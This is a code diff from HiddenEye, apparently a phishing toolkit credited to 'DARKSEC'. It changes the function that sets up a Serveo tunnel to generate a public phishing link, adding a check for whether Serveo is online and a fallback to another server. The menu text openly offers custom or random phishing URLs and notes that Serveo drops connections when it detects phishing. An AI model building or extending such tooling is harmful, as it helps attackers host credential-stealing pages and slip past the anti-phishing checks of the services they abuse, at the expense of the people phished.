@@ -147,24 +147,34 @@ def start_serveo(port):
             run_command('clear')
             return custom(port)
     
-    print('''
-        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-        {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ SERVEO URL TYPE SELECTION ]{1}!! {0}\n-------------------------------\n{0}[{1}!{0}]{1}REMEMBER ? Serveo Don't Allows Phishing.\n{0}[{1}!{0}]{1}They Drops The Connection Whenever Detects Phishing. '''.format(default_palette[0], default_palette[2]))
-    print("\n{0}[{1}*{0}]{0}CHOOSE ANY SERVEO URL TYPE TO GENERATE PHISHING LINK:{1}".format(default_palette[0], default_palette[2]))
-    print("\n{0}[{1}1{0}]{1}Custom URL {0}(Generates designed url) \n{0}[{1}2{0}]{1}Random URL {0}(Generates Random url)".format(default_palette[0], default_palette[2]))
-    choice = input("\n\n{0}YOUR CHOICE >>> {1}".format(default_palette[0], default_palette[2]))
-    run_command('clear')
-    if choice == '1':
-
-        custom(port)
-    elif choice == '2':
-        random(port)
-    else:
+    if is_online == True:
+        print('''
+            {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+            |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+            |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+            {0}http://github.com/darksecdevelopers
+            {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ SERVEO URL TYPE SELECTION ]{1}!! {0}\n-------------------------------\n{0}[{1}!{0}]{1}REMEMBER ? Serveo Don't Allows Phishing.\n{0}[{1}!{0}]{1}They Drops The Connection Whenever Detects Phishing. '''.format(default_palette[0], default_palette[2]))
+        print("\n{0}[{1}*{0}]{0}CHOOSE ANY SERVEO URL TYPE TO GENERATE PHISHING LINK:{1}".format(default_palette[0], default_palette[2]))
+        print("\n{0}[{1}1{0}]{1}Custom URL {0}(Generates designed url) \n{0}[{1}2{0}]{1}Random URL {0}(Generates Random url)".format(default_palette[0], default_palette[2]))
+        choice = input("\n\n{0}YOUR CHOICE >>> {1}".format(default_palette[0], default_palette[2]))
         run_command('clear')
-        return start_serveo(port)
+        if choice == '1':
+
+            custom(port)
+        elif choice == '2':
+            random(port)
+        else:
+            run_command('clear')
+            return start_serveo(port)
+    else:
+        print("Serveo is DOWN now, do you want to select another option? Y/n")
+        choice = input("HiddenEye >> ")
+        if choice == 'Y' or choice == 'y':
+            return server_menu.server_selection(port)
+        else:
+            return start_serveo(port)
+
+            
 
 def start_localxpose(port):
     
